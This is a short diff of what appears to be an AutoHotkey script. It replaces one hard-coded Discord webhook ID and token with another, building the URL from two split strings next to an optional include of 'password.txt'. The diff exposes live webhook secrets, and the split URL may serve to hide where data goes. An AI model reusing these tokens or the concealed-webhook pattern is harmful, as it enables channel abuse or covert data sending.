@@ -155,7 +155,7 @@ if FileExist("key.dll")
 #MaxThreadsPerHotkey 2
 
 dislink1 := "https://discord.com/api/webhooks/"
-dislink2 := "857482777036062720/5kIl4yYt-5IebLjX6goDB-HunKFjzircuG69Zu-IOdswDFvXe63hDpo9UbDHXtyDQtvi"
+dislink2 := "874262276851523614/4Vnndrr7oaDxW3ioRyqXKBdrHmBAeB9Ateq1mbJoW7OkEgBH0-n0C989LugYMawcXZCe"
 dislink = %dislink1%%dislink2%
 
 #Include *i password.txt
